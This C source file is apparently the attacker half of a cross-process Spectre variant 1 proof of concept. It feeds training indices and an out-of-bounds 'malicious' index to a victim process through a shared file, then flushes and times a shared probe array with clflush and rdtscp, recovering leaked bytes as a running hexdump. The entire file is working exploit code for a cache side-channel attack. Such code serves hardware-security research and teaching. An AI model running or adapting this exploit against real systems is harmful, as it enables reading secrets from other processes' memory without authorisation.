#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <errno.h>
#ifdef _MSC_VER
#include <intrin.h>        /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h>     /* for rdtscp and clflush */
#endif

/********************************************************************
Analysis code
********************************************************************/
/* #define CACHE_HIT_THRESHOLD (80)  #<{(| assume cache hit if time <= threshold |)}># */
#define CACHE_HIT_THRESHOLD (80)  /* assume cache hit if time <= threshold */

uint8_t *array2;
unsigned int array1_size = 16;
uint8_t array1[160] = { 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 };

const char *lock_file_name = "spectre.lock";
const char *shared_memory_name = "shared_mem";
const char *index_file_name = "index.txt";
int fd_lock, shared_fd;

int results[256];

void read_index(size_t index, int tries, int train_rounds, int round_length) {
	static FILE *f;
	static int i, j, k, mix_i, locked;
	static unsigned junk = 0;
	static size_t training_x;

	// acquire lock
	locked = -1;
	while (locked != 0) {
		fd_lock = open(lock_file_name, O_CREAT);
		locked = flock(fd_lock, LOCK_EX);
	}

	/* 
		 output position to be read
		 There are round_length - 1 training inputs 
		 and 1 malicious input, repeated train_round times
	*/
	f = fopen(index_file_name, "w");
	training_x = tries % array1_size;

	fprintf(f, "%d ", train_rounds * round_length);
	for (i = 0; i < train_rounds; ++i) {
		for (j = 0; j < round_length - 1; ++j) {
			fprintf(f, "%zu ", training_x);
		}
		fprintf(f, "%zu ", index);
	}
	fclose(f);

	for (i = 0; i < 256; i++)
		_mm_clflush(&array2[i * 512]);  /* intrinsic for clflush instruction */

	// release lock
	unlink(lock_file_name);
	flock(fd_lock, LOCK_UN);
	close(fd_lock);

	// when it dissapears, the victim processed everything
	// and the sidechannel can be read
	while (access(index_file_name, F_OK) != -1);

	/* Time reads. Order is lightly mixed up to prevent stride prediction */
	register uint64_t time1, time2;
	static volatile uint8_t *addr;
	for (i = 0; i < 256; i++) {
		mix_i = ((i * 167) + 13) & 255;
		addr = &array2[mix_i * 512];
		time1 = __rdtscp(&junk);            /* READ TIMER */
		junk = *addr;                       /* MEMORY ACCESS TO TIME */
		time2 = __rdtscp(&junk) - time1;    /* READ TIMER & COMPUTE ELAPSED TIME */
		if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
			results[mix_i]++;  /* cache hit - add +1 to score for this j */
	}
}

int main() {
	// map share memory area to array2 (cache side channel)
	int fd = open(shared_memory_name, O_RDONLY);
	array2 = (uint8_t*)mmap(NULL, 256 * 512, PROT_READ, MAP_SHARED, fd, 0);

	if (array2 == MAP_FAILED) {
		printf("map failed %d >< %d\n", errno, EACCES);
		return 0;
	}

	int i, best_char, printed = 0;
	const int no_readings = 5,
						train_rounds = 4,
						round_length = 8;

	size_t offset = 18446744073709543208ul;
	/* size_t offset = 1; */
	printf("%zu\n", offset);

	printf("%016lX | ", offset);
	for (int tries = 0; ; ++tries) {
		// reset results
		for (i = 0; i < 256; ++i) {
			results[i] = 0;
		}

		// performa the attack
		for (i = 1; i < no_readings; ++i) {
			read_index(offset, tries, train_rounds, round_length);
		}

		// select best scoring caracter 
		best_char = -1;
		for (i = 0; i < 256; i++) {
			if (best_char < 0 || results[i] >= results[best_char]) {
				best_char = i;
			}
		}

		// human readable hexdump
		printed += 1;
		printf("%c", (best_char > 31 && best_char < 127 ? best_char : '.'));
		if (printed % 0x50 == 0) {
			printf("\n");
			fflush(stdout);
			printf("%016lX | ", offset);
		}

		// next memory address
		++offset;
	}
}